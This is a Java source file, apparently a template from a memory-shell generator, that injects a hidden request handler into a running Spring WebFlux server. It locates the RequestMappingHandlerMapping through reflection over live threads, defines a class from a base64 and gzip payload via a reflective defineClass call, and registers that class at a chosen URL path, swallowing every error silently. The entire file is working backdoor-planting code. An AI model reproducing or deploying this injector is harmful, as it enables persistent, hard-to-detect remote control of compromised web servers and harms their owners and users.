package jmg.core.template;

import org.springframework.web.reactive.result.method.RequestMappingInfo;
import org.springframework.web.server.ServerWebExchange;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Collection;
import java.util.zip.GZIPInputStream;

/**
 *  spring webflux + netty(default) -> spring RequestMappingHandlerMapping -> registerHandlerMethod
 */
public class SpringWebFluxHandlerMethodInjectorTpl {


    public String getUrlPattern() {
        return "";
    }

    public String getClassName() {
        return "";
    }

    public String getBase64String() throws IOException {
        return "";
    }

    public SpringWebFluxHandlerMethodInjectorTpl() {
        try {
            Object requestMappingHandlerMapping = getRequestMappingHandlerMapping();
            Object handlerMethod = getHandlerMethod();
            addHandlerMethod(requestMappingHandlerMapping, handlerMethod);
        } catch (Exception ignored) {
        }
    }

    private Object getRequestMappingHandlerMapping() throws Exception {
        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads");
        Object requestMappingHandlerMapping = null;
        for (int i = 0; i < threads.length; i++) {
            try {
                Collection handlerMappings = (Collection) getFV(getFV(getFV(getFV(getFV(getFV(getFV(getFV(threads[i], "this$0"), "handler"), "httpHandler"), "delegate"), "delegate"), "delegate"), "delegate"), "handlerMappings");
                Object[] objects = handlerMappings.toArray();
                boolean flag = false;
                for (int j = 0; j < objects.length; j++) {
                    if (objects[j].getClass().getName().contains("RequestMappingHandlerMapping")) {
                        requestMappingHandlerMapping = objects[j];
                        flag = true;
                    }
                }
                if (flag) {
                    return requestMappingHandlerMapping;
                }
            } catch (Exception ignored) {
            }
        }
        return requestMappingHandlerMapping;
    }

    public void addHandlerMethod(Object obj, Object handler) {
        try {
            Method method = handler.getClass().getDeclaredMethod("invoke", ServerWebExchange.class);
            RequestMappingInfo requestMappingInfo = RequestMappingInfo.paths(getUrlPattern()).build();
            invokeMethod(obj, "registerHandlerMethod", new Class[]{Object.class, Method.class, RequestMappingInfo.class}, new Object[]{handler, method, requestMappingInfo});
        } catch (Exception ignored) {
        }
    }

    private Object getHandlerMethod() {
        Object handler = null;
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        try {
            handler = classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class clazz = (Class) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                handler = clazz.newInstance();
            } catch (Exception ignored) {
            }

        }
        return handler;
    }


    private static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];
        int n;
        while ((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }

    private static Object getFV(Object obj, String fieldName) throws Exception {
        Field field = getF(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    private static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }


    private static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    private static synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
        Method method = null;

        Class tempClass = clazz;
        while (method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    // Get all declared methods of the class
                    Method[] methods = tempClass.getDeclaredMethods();
                    for (int i = 0; i < methods.length; i++) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                tempClass = tempClass.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        if (obj instanceof Class) {
            try {
                return method.invoke(null, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        } else {
            try {
                return method.invoke(obj, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        }

    }
}
